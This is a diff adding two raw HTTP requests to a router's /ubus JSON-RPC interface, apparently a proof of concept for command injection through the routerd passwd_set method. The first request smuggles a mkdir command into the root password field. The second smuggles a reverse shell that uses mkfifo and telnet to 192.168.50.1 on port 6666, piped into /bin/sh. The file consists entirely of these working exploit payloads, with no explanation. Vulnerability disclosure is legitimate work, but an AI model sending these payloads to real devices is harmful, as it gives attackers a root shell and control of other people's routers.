@@ -1,0 +1,31 @@
+POST /ubus HTTP/1.1
+Host: 192.168.50.2
+Content-Length: 163
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-US,en;q=0.9
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
+Origin: http://192.168.50.2
+Referer: http://192.168.50.2/guide/guide.html
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+{"jsonrpc":"2.0","id":22,"method":"call","params":["4505432ee9121d0da47ac7a195f69365","routerd","passwd_set",{"user":"root","pwd":"admin123;mkdir -p /tmp/test1"}]}
+
+--------------------------------------------------------------------------------------------------------------------------------------------------
+
+POST /ubus HTTP/1.1
+Host: 192.168.50.2
+Content-Length: 214
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-US,en;q=0.9
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
+Origin: http://192.168.50.2
+Referer: http://192.168.50.2/guide/guide.html
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+{"jsonrpc":"2.0","id":22,"method":"call","params":["4505432ee9121d0da47ac7a195f69365","routerd","passwd_set",{"user":"root","pwd":"admin;mkfifo /tmp/test;telnet 192.168.50.1 6666 0</tmp/test|/bin/sh > /tmp/test"}]}
